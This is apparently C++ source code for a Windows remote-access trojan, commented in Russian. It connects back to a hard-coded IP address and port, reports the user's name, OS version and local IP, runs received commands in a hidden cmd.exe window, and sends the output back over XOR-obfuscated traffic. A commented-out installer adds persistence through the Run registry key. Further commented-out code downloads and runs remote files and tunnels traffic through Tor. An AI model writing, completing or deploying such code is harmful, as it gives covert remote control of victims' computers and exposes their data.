//
// Стоит всё это переписать с использованием блокирующих вызовов фунций для работы с сетью (((
//

#include "stdafx.h"
#include "Client.h"
#include "..\Server\Packet.h"

// Настройки клиента
#define ADDRES_SERVER	"95.84.137.64"
#define PORT			666

// Глобальные переменные
char recvBuffer[PACKET_SIZE];
int numRecv = 0;
HINSTANCE hInst;								// Текущий экземпляр приложения
TCHAR szWindowClass[100] = "Client";			// Название класса окна
char version[] = "version 1.0";					// Версия клиента
char bufferReport[PACKET_DATA_SIZE] = "";		// Буфер для отчета cmd
char* uBufferReport = 0;						// Указатель на буфер отчета cmd								
int localId = 0;								// ID выданное сервером этому клиенту
char chLocalID[10] = "";						// Текстовое ID
HKEY hKey;										// Дескриптор открытого ключа в реестре
HWND hWnd;

// Переменные для работы с сетью
SOCKET conSock;					// Сокет для подключения к серверу
BOOL writeAccess = FALSE;		// Индикатор доступа к записи в сокет
char* writeBuffer = 0;			// Временный буфер
int sizeWriteBuffer = 0;		// Размер временного буфера
int sizeDataWriteBuffer = 0;	// Размер данных во временном буфере

// Данные отправляемые для регистрации на сервере
char compIP[200] = "";
char osVersion[200] = "";
char userName[200] = "";

// Массивы для путей к папкам и файлам
char appPath[500];			// Папка APPDATA
char clientPath[500];		// Папка программы
char clientFileName[500];	// Полный путь к программе
char currentFileName[500];	// Полный путь к текущему процессу

// Объявления функций
void	CloseProcess(const char* processName);
void	InstallClient();
bool	Unzip2Folder(BSTR lpZipFile, BSTR lpFolder);
void	GetCompIP(char*);
void	GetOSVersion(char*);
void	GetUserInfo(char*);
void	ExecuteCMD(char*, char*);
bool	isProcessRun(const char*);
ATOM	MyRegisterClass(HINSTANCE hInstance);
BOOL	InitInstance(HINSTANCE, int);
LRESULT	CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
SOCKET ConnectServer(HWND hWnd, const char* addres_server);
BOOL ReadBuffer();
BOOL SendPacket(Packet* packet);
BOOL WriteBuffer();
void CloseConnect(HWND hWnd);
void Crypt(char* cryptData, int sizeCryptData);
DWORD ParsePacketType(char* data);
DWORD ParseID(char* data);
DWORD ParseID1(char* data);
DWORD ParseID2(char* data);
BOOL WorkData(Packet* pak);

// Точка входа
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Заполняем пути к папкам и файлам
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appPath);
	lstrcpy(clientPath, appPath);
	lstrcat(clientPath, "\\Client");
	lstrcpy(clientFileName, appPath);
	lstrcat(clientFileName, "\\Client\\client.exe");
	GetModuleFileName(GetModuleHandle(NULL), currentFileName, 256);

	// Код установки закоментирован для удобной отладки
	// Для реального использования программы раскоментируйте этот код

/*
	// Если программа запущена не из дирректории установки
	if (_stricmp(clientFileName, currentFileName) != NULL)
	{
		// Устанавливаем клиент
		InstallClient();

		// Выводим сообщение пользователю
		MessageBox(NULL, "Программа успешно установлена", "Установка", MB_OK);

		// Завершаем программу
		ExitProcess(0);
	}
*/

	// Инициализируем библиотеку сокетов
	WORD	wsaVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(wsaVersion, &wsaData) != NO_ERROR)
	{
		// Ошибка, завершаем программу
		ExitProcess(0);
	}

	MSG msg;
	MyRegisterClass(hInstance);

	// Выполнить инициализацию приложения:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	// Цикл обработки сообщений
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return (int)msg.wParam;
}

// Регистрирует класс окна
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	return RegisterClassEx(&wcex);
}

// В данной функции дескриптор экземпляра сохраняется в глобальной переменной, а также
// создается и выводится на экран главное окно программы.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Сохранить дескриптор экземпляра в глобальной переменной

	hWnd = CreateWindow(szWindowClass, "Client", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

	if (!hWnd)
	{
		return FALSE;
	}
	return TRUE;
}

//
// Оконная функция, обрабатывает сообщения сокета.
// По сути это однопоточный ассинхронный сервер с обратным соединением.
// Подключается к одному единственному клиенту и работает только с ним.
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int Event = 0; // Событие на сокете

	switch (message)
	{
	case WM_CREATE:

		// Вызов следующей функции блокирует поток выполнения программы
		// до подключения к серверу (спешить некуда, будем висеть)
		conSock = ConnectServer(hWnd, ADDRES_SERVER);
		break;

	case WM_SOCKET:

		// Сообщения от сокетов
		Event = WSAGETSELECTEVENT(lParam);
		switch (Event)
		{
		case FD_CLOSE:

			CloseConnect(hWnd);
			conSock = ConnectServer(hWnd, ADDRES_SERVER);
			break;

		case FD_WRITE:

			// Сокет доступен для записи, пишем в сокет данные из временного буффера, если они там есть
			if (WriteBuffer() == FALSE)
			{
				// Ошибка записи, разрываем соединение
				CloseConnect(hWnd);
			}
			break;

		case FD_READ:

			// Читаем пришедшие данные
			if (ReadBuffer() == FALSE)
			{
				// Ошибка чтения, разрываем соединение
				CloseConnect(hWnd);
			}
			break;
		}
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

//
//		Функция выполняет ассинхронное подключения к серверу
//		Возвращает ассинхронный сокет, подключенный к серверу
//		Параметры:
//		HWND hWnd				- окно, к которому привязываются сетевые события
//		char* addres_server		- адрес сервера
//		int port				- порт
//		
SOCKET ConnectServer(HWND hWnd, const char* addres_server)
{
	SOCKET connectServer;
	SOCKADDR_IN serverAddr;		// Структура для подключения
	char buffer[256];			// Буфер для обмена по протоколу SOCKS5

	while (TRUE)
	{
		Sleep(1000);
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(PORT);
		connectServer = socket(AF_INET, SOCK_STREAM, 0);
		serverAddr.sin_addr.s_addr = inet_addr(addres_server);
		if (connect(connectServer, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
		{
			// Ошибка, пробуем снова подключиться
			closesocket(connectServer);
			continue;
		}

		// Успешно подключились, выходим из функции, возвращаем ассинхронный сокет подключенный к серверу
		WSAAsyncSelect(connectServer, hWnd, WM_SOCKET, FD_READ | FD_WRITE | FD_CLOSE);

		// Обновляем переменные для работы с сетью
		numRecv = 0;				// Число прочитанных данных (для поддержки докачки)
		writeAccess = FALSE;		// Индикатор доступа к записи в сокет
		sizeDataWriteBuffer = 0;	// Размер данных во временном буфере

		return connectServer;
	}
}

// Возвращает сообщение клиента
BOOL ReadBuffer()
{
	// Читаем пришедшие данные
	int iResult = recv(conSock, recvBuffer + numRecv, PACKET_SIZE - numRecv, 0);
	if (iResult == PACKET_SIZE - numRecv)
	{
		// Данные пакета прочитаны полностью
		numRecv = 0;

		// Расшифровываем данные
		Crypt(recvBuffer, PACKET_SIZE);

		Packet pak;
		pak.type = ParsePacketType(recvBuffer);
		pak.id = ParseID(recvBuffer);
		pak.id1 = ParseID1(recvBuffer);
		pak.id2 = ParseID2(recvBuffer);
		memcpy(pak.data, recvBuffer + 16, PACKET_DATA_SIZE);
		if (WorkData(&pak) == FALSE)
			return FALSE;
		else
			return TRUE;

	}
	else if (iResult < PACKET_SIZE - numRecv)
	{
		// Данные пакета не полностью прочитаны
		numRecv = numRecv + iResult;
		return TRUE;
	}
	else if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
	{
		// Сокет заблокирован
		return TRUE;
	}
	else
	{
		//Во всех остальных случаях ошибка
		return FALSE;
	}
}

BOOL WorkData(Packet* pak)
{
	switch (pak->type)
	{
	case PACKET_ADD_ID:

		// Сохраняем ID назначенное сервером в переменной
		localId = pak->id;
		sprintf_s(chLocalID, sizeof(chLocalID), "%d", pak->id);

		// Очищаем массивы для данных
		ZeroMemory(compIP, 200);
		ZeroMemory(osVersion, 200);
		ZeroMemory(userName, 200);

		// Заполняем массивы данными
		GetUserInfo(userName);
		GetOSVersion(osVersion);
		GetCompIP(compIP);

		// Собираем пакет и отправляем его на сервер
		pak->type = PACKET_USER_JOINED;
		sprintf_s(pak->data, PACKET_DATA_SIZE, "%s|%s|%s|%s|%s", chLocalID, userName, osVersion, compIP, version);
		SendPacket(pak);
		return TRUE;

	case PACKET_CMD:

		ZeroMemory(bufferReport, PACKET_DATA_SIZE);
		ExecuteCMD(bufferReport, pak->data);
		if (lstrlen(bufferReport))
		{
			pak->type = PACKET_CMD_REPORT;
			ZeroMemory(pak->data, PACKET_DATA_SIZE);
			memcpy(pak->data, bufferReport, PACKET_DATA_SIZE);
			SendPacket(pak);
		}

		return TRUE;
	}
}

// Расшифровка пакета
void Crypt(char* cryptData, int sizeCryptData)
{
	const unsigned char key[8] = { 193, 127, 143, 121, 167, 179, 187, 191 }; // Ключ шифрования
	int iKey = 0;
	char ch;

	for (int i = 0; i < sizeCryptData; i++)
	{
		ch = cryptData[i];
		cryptData[i] = ch ^ key[iKey];
		iKey++;
		iKey %= 8;
	}
	return;
}

DWORD ParsePacketType(char* data)
{
	char* uR = 0;
	DWORD packetType;

	// Парсим тип пакета
	uR = (char*)&packetType;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i];
	}
	return packetType;
}

DWORD ParseID(char* data)
{
	char* uR = 0;
	DWORD id;

	// Парсим тип пакета
	uR = (char*)&id;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 4];
	}
	return id;
}

DWORD ParseID1(char* data)
{
	char* uR = 0;
	DWORD id1;

	// Парсим тип пакета
	uR = (char*)&id1;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 8];
	}
	return id1;
}

DWORD ParseID2(char* data)
{
	char* uR = 0;
	DWORD id2;

	// Парсим тип пакета
	uR = (char*)&id2;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 12];
	}
	return id2;
}

// Функция отсылает сообщение клиенту
BOOL SendPacket(Packet* packet)
{
	DWORD* uF = 0;
	char bufferSend[PACKET_SIZE];

	uF = (DWORD*)&bufferSend;
	*uF = packet->type;
	uF = (DWORD*)&bufferSend[4];
	*uF = packet->id;
	uF = (DWORD*)&bufferSend[8];
	*uF = packet->id1;
	uF = (DWORD*)&bufferSend[12];
	*uF = packet->id2;

	memcpy(bufferSend + 16, packet->data, PACKET_DATA_SIZE);

	Crypt(bufferSend, PACKET_SIZE);

	if (writeAccess == FALSE)
	{
		// Доступ к записи в сокет закрыт
		if (sizeWriteBuffer - sizeDataWriteBuffer < PACKET_SIZE)
		{
			// В буфере нет места для нового пакета, приращиваем буфер
			writeBuffer = (char*)realloc(writeBuffer, sizeWriteBuffer + PACKET_SIZE);
			sizeWriteBuffer = sizeWriteBuffer + PACKET_SIZE;
		}

		// Пишем во временный буфер
		memcpy(writeBuffer + sizeDataWriteBuffer, bufferSend, PACKET_SIZE);
		sizeDataWriteBuffer = sizeDataWriteBuffer + PACKET_SIZE;
		writeAccess = FALSE;
		return TRUE;
	}
	else if (writeAccess == TRUE)
	{
		// Доступ к записи в сокет открыт, пишем в сокет
		int iSend = send(conSock, bufferSend, PACKET_SIZE, 0);
		if (iSend == PACKET_SIZE)
		{
			//Отправка данных прошла успешно
			sizeDataWriteBuffer = 0;
			return TRUE;
		}
		else if (iSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// Сокет заблокирован, пишем во временный буфер
			memcpy(writeBuffer, bufferSend, PACKET_SIZE);
			sizeDataWriteBuffer = PACKET_SIZE;
			writeAccess = FALSE;
			return TRUE;
		}
		else
		{
			// Ошибка записи в сокет
			return FALSE;
		}
	}
}

// Отправляет данные из временного буффера
BOOL WriteBuffer()
{
	// Устанавливаем индикатор открытого доступа для записи в сокет
	writeAccess = TRUE;

	if (sizeDataWriteBuffer != 0)
	{
		// Во временном буффере есть данные для отправки
		int errSend = send(conSock, writeBuffer, sizeDataWriteBuffer, 0);
		if (errSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// Сокет заблокирован
			writeAccess = FALSE;
			return TRUE;
		}
		else if (errSend == sizeDataWriteBuffer)
		{
			writeAccess = TRUE;
			sizeDataWriteBuffer = 0;
			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}

	// Во временном буфере нет данных для отправки
	// Просто возвращаем успех и выходим
	return TRUE;
}

void CloseConnect(HWND hWnd)
{
	// Отключаемся
	closesocket(conSock);
	numRecv = 0;
	writeAccess = FALSE;
	sizeDataWriteBuffer = 0;

	return;
}

// Функция определяет локальный IP адрес
void GetCompIP(char* chIP)
{
	char * uIP = 0;
	char name[200] = "";
	PHOSTENT hostinfo;

	// Определяем имя хоста
	if (gethostname(name, 200) == 0)
	{
		if ((hostinfo = gethostbyname(name)) != NULL)
		{
			uIP = inet_ntoa(*(struct in_addr *)*hostinfo->h_addr_list);
			sprintf_s(chIP, 200, "%s", uIP);
			return;
		}
	}

	// Ошибка
	chIP = 0;
	return;
}

// Версия Windows
void GetOSVersion(char* os)
{
	if (IsWindows8Point1OrGreater())
	{
		lstrcpy(os, "Windows 8.1");
		return;
	}
	else if (IsWindows8OrGreater())
	{
		lstrcpy(os, "Windows 8");
		return;
	}
	else if (IsWindows7SP1OrGreater())
	{
		lstrcpy(os, "Windows 7 SP1");
		return;
	}
	else if (IsWindows7OrGreater())
	{
		lstrcpy(os, "Windows 7");
		return;
	}
	else if (IsWindowsVistaSP2OrGreater())
	{
		lstrcpy(os, "Windows Vista SP2");
		return;
	}
	else if (IsWindowsVistaSP1OrGreater())
	{
		lstrcpy(os, "Windows Vista SP1");
		return;
	}
	else if (IsWindowsVistaOrGreater())
	{
		lstrcpy(os, "Windows Vista");
		return;
	}
	else if (IsWindowsXPSP3OrGreater())
	{
		lstrcpy(os, "Windows XP SP3");
		return;
	}
	else if (IsWindowsXPSP2OrGreater())
	{
		lstrcpy(os, "Windows XP SP2");
		return;
	}
	else if (IsWindowsXPSP1OrGreater())
	{
		lstrcpy(os, "Windows XP SP1");
		return;
	}
	else if (IsWindowsXPOrGreater())
	{
		lstrcpy(os, "Windows XP");
		return;
	}
	else
	{
		lstrcpy(os, "No OS");
		return;
	}
}

void GetUserInfo(char* userName)
{
	DWORD nUserName = 200;
	GetUserName(userName, &nUserName);
	return;
}

void ExecuteCMD(char* result, char * command)
{
	SECURITY_ATTRIBUTES sec;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	HANDLE hOutR, hOutW;
	DWORD BTAvail;
	char * Result = NULL;
	char cmdline[500] = "";
	char cmdpath[256] = "";
	DWORD Read = 0;

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&sec, sizeof(SECURITY_ATTRIBUTES));
	sec.nLength = sizeof(SECURITY_ATTRIBUTES);
	sec.bInheritHandle = TRUE;
	sec.lpSecurityDescriptor = NULL;

	if (CreatePipe(&hOutR, &hOutW, &sec, 0))
	{
		ZeroMemory(&si, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		si.hStdOutput = hOutW;
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		lstrcpy(cmdline, " /a /c ");
		lstrcat(cmdline, command);

		GetEnvironmentVariable("ComSpec", cmdpath, 2048);

		if (CreateProcess(cmdpath, cmdline, &sec, &sec, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			PeekNamedPipe(hOutR, NULL, 0, NULL, &BTAvail, NULL);
			if (BTAvail > 0)
			{
				//Result = (char *)GlobalAlloc(GMEM_FIXED, BTAvail + 1);
				ReadFile(hOutR, result, BTAvail, &Read, NULL);
				result[BTAvail] = '\0';
				OemToChar(result, result);
				if (lstrlen(result) > 0)
				{
					return;
				}
				else
				{
					lstrcpy(result, "\n command executed \n");
					return;
				}
			}
		}
	}
	return;
}

bool Unzip2Folder(BSTR lpZipFile, BSTR lpFolder)
{
	IShellDispatch *pISD;

	Folder  *pZippedFile = 0L;
	Folder  *pDestination = 0L;

	long FilesCount = 0;
	IDispatch* pItem = 0L;
	FolderItems *pFilesInside = 0L;

	VARIANT Options, OutFolder, InZipFile, Item;
	CoInitialize(NULL);
	__try {
		if (CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void **)&pISD) != S_OK)
			return 1;

		InZipFile.vt = VT_BSTR;
		InZipFile.bstrVal = lpZipFile;
		pISD->NameSpace(InZipFile, &pZippedFile);
		if (!pZippedFile)
		{
			pISD->Release();
			return 1;
		}

		OutFolder.vt = VT_BSTR;
		OutFolder.bstrVal = lpFolder;
		pISD->NameSpace(OutFolder, &pDestination);
		if (!pDestination)
		{
			pZippedFile->Release();
			pISD->Release();
			return 1;
		}

		pZippedFile->Items(&pFilesInside);
		if (!pFilesInside)
		{
			pDestination->Release();
			pZippedFile->Release();
			pISD->Release();
			return 1;
		}

		pFilesInside->get_Count(&FilesCount);
		if (FilesCount < 1)
		{
			pFilesInside->Release();
			pDestination->Release();
			pZippedFile->Release();
			pISD->Release();
			return 0;
		}

		pFilesInside->QueryInterface(IID_IDispatch, (void**)&pItem);

		Item.vt = VT_DISPATCH;
		Item.pdispVal = pItem;

		Options.vt = VT_I4;
		Options.lVal = 1024 | 512 | 16 | 4;//http://msdn.microsoft.com/en-us/library/bb787866(VS.85).aspx

		bool retval = pDestination->CopyHere(Item, Options) == S_OK;

		pItem->Release(); pItem = 0L;
		pFilesInside->Release(); pFilesInside = 0L;
		pDestination->Release(); pDestination = 0L;
		pZippedFile->Release(); pZippedFile = 0L;
		pISD->Release(); pISD = 0L;

		return retval;

	}
	__finally
	{
		CoUninitialize();
	}
}

// Функция проверяет запущен ли указанный процесс
bool isProcessRun(const char* processName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		if (Process32First(hSnap, &pe32))
		{
			if (strcmp(pe32.szExeFile, processName) == 0)
			{
				return TRUE;
			}
			while (Process32Next(hSnap, &pe32))
			{
				if (strcmp(pe32.szExeFile, processName) == 0)
				{
					return TRUE;
				}
			}
		}
	}
	CloseHandle(hSnap);
	return FALSE;
}

// Функция устанавливает клиент и удаляет старый клиент вместе с TOR, если они были установлены
void InstallClient()
{
	// Если программа уже запущена
	if (isProcessRun("client.exe"))
	{
		// Выключаем ранее запущенную программу
		CloseProcess("client.exe");
	}

	// Выносим весь каталог
	char killDir[1024] = "";
	lstrcat(killDir, clientPath);
	lstrcat(killDir, "\0");
	SHFILEOPSTRUCT sh;
	sh.wFunc = FO_DELETE;
	sh.pFrom = killDir;
	sh.pTo = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;
	SHFileOperation(&sh);

	// Создаем папку для нашей программы
	CreateDirectory(clientPath, NULL);

	// Копируем текущую программу в папку установки программы (поверх старой программы, если вдруг она там осталась)
	CopyFile(currentFileName, clientFileName, FALSE);

	// Открываем автозагрузку в реестре
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
	{
		// Успешно открыли, добавляем в автозагрузку нашу программу
		RegSetValueEx(hKey, "client", 0, REG_SZ, (BYTE*)clientFileName, lstrlen(clientFileName));
		RegCloseKey(hKey);
	}
	return;
}

void CloseProcess(const char* processName)
{

}






/*SOCKS
// Шлем приветствие
buffer[0] = 5; // номер версии SOCKS
buffer[1] = 1; // количество поддерживаемых методов аутентификации
buffer[2] = 0; //  аутентификация не требуется
if (send(connectServer, buffer, 3, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

//Ждем ответа от SOCKS
if (recv(connectServer, buffer, 256, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

// Отправляем запрос на соединение
buffer[0] = 5;													// номер версии SOCKS
buffer[1] = 1;													// установка TCP/IP соединения
buffer[2] = 0;													// зарезервированный байт, должен быть 0x00
buffer[3] = 3;													// Тип адреса - доменное имя
buffer[4] = strlen(addres_server);								// Длинна доменного имени
memcpy(&buffer[5], addres_server, strlen(addres_server));		// Копируем доменное имя
*((u_short*)(buffer + 5 + strlen(addres_server))) = htons(666);	// Устанавливаем порт
if (send(connectServer, buffer, 29, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

// Ждем ответ об успешности соединения
if (recv(connectServer, buffer, 256, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}
else if (buffer[1] != 0)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
Sleep(10000);
continue;
}

*/

/*				// Строка для команды
char command[10] = "";

// Парсим в строку команду
for (int x = 0; x < 5; x++)
{
if (client.data[x] == ' ')
{
break;
}
command[x] = client.data[x];
}

if (lstrcmp(command, "down") == 0)
{
char url[1024] = "";
char nameDownFile[1024] = "";
int x = 5;
int y = 0;

// Парсим URL
while (client.data[x] != ' ')
{
url[y] = client.data[x];
x++;
y++;
}
x++;

lstrcat(nameDownFile, clientPath);
lstrcat(nameDownFile, "\\");
lstrcat(nameDownFile, client.data + x);
if (URLDownloadToFile(NULL, url, nameDownFile, 0, NULL) == S_OK)
{
client.packetType = PACKET_CMD_REPORT;
lstrcpy(client.data, "Зазрузка файла успешно завершена");
client.SendPacket(0);
}
else
{
client.packetType = PACKET_CMD_REPORT;
lstrcpy(client.data, "Ошибка загрузки файла");
client.SendPacket(0);
}
}
else if (lstrcmp(command, "run") == 0)
{
char nameProcess[100] = "";

lstrcat(nameProcess, clientPath);
lstrcat(nameProcess, "\\");
lstrcat(nameProcess, client.data + 4);

STARTUPINFO sti;						// Структура определяющая внешний вид окна для нового процесса
ZeroMemory(&sti, sizeof(STARTUPINFO));	// Обнуляем структуру
sti.cb = sizeof(STARTUPINFO);			// Указать размер структуры
PROCESS_INFORMATION pi;					// Заполняется функцией CreateProcess
CreateProcess(nameProcess, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &sti, &pi);
}
else if (lstrcmp(command, "cmd") == 0)
{
ZeroMemory(bufferReport, PACKET_DATA_SIZE);
ExecuteCMD(bufferReport, client.data + 4);
if (lstrlen(bufferReport))
{
client.packetType = PACKET_CMD_REPORT;
ZeroMemory(client.data, PACKET_DATA_SIZE);
memcpy(client.data, bufferReport, PACKET_DATA_SIZE);
client.SendPacket(0);
}
}
break;
}
break;
}


// Запускаем TOR
STARTUPINFO sti;						// Структура определяющая внешний вид окна для нового процесса
ZeroMemory(&sti, sizeof(STARTUPINFO));	// Обнуляем структуру
sti.cb = sizeof(STARTUPINFO);			// Указать размер структуры
PROCESS_INFORMATION pi;					// Заполняется функцией CreateProcess
CreateProcess(nameProcessTor, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sti, &pi);

// Функция устанавливает TOR
bool InstallTOR()
{
// Загружаем архив TOR с официального сайта
LRESULT resDown;

while (URLDownloadToFile(NULL, "https://www.torproject.org/dist/torbrowser/7.5/tor-win32-0.3.2.9.zip", zipTor, 0, NULL) != S_OK)
{
Sleep(120000);
}

// Задаем языковой стандарт
_locale_t locale = _create_locale(LC_ALL, "Russian");

// Преобразовываем полный путь к tor.zip в юникод
size_t sZipTor = strlen(zipTor) + 1;
size_t convertChar = 0;
wchar_t* wZipTor = new wchar_t[sZipTor];
_mbstowcs_s_l(&convertChar, wZipTor, sZipTor, zipTor, _TRUNCATE, locale);

// Преобразовываем путь к папке программы в юникод
size_t sAnubisPath = strlen(clientPath) + 1;
convertChar = 0;
wchar_t* wAnubisPath = new wchar_t[sAnubisPath];
_mbstowcs_s_l(&convertChar, wAnubisPath, sAnubisPath, clientPath, _TRUNCATE, locale);

// Распаковываем архив
BSTR bstrZipTOR = SysAllocString(wZipTor);
BSTR bstrAnubisPath = SysAllocString(wAnubisPath);
Unzip2Folder(bstrZipTOR, bstrAnubisPath);

return TRUE;
}

// Шлем приветствие
buffer[0] = 5; // номер версии SOCKS
buffer[1] = 1; // количество поддерживаемых методов аутентификации
buffer[2] = 0; //  аутентификация не требуется
if (send(connectServer, buffer, 3, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

//Ждем ответа от SOCKS
if (recv(connectServer, buffer, 256, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

// Отправляем запрос на соединение
buffer[0] = 5;													// номер версии SOCKS
buffer[1] = 1;													// установка TCP/IP соединения
buffer[2] = 0;													// зарезервированный байт, должен быть 0x00
buffer[3] = 3;													// Тип адреса - доменное имя
buffer[4] = strlen(addres_server);								// Длинна доменного имени
memcpy(&buffer[5], addres_server, strlen(addres_server));		// Копируем доменное имя
*((u_short*)(buffer + 5 + strlen(addres_server))) = htons(666);	// Устанавливаем порт
if (send(connectServer, buffer, 29, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}

// Ждем ответ об успешности соединения
if (recv(connectServer, buffer, 256, 0) == SOCKET_ERROR)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
continue;
}
else if (buffer[1] != 0)
{
// Ошибка, пробуем снова подключиться
closesocket(connectServer);
Sleep(10000);
continue;
}

*/

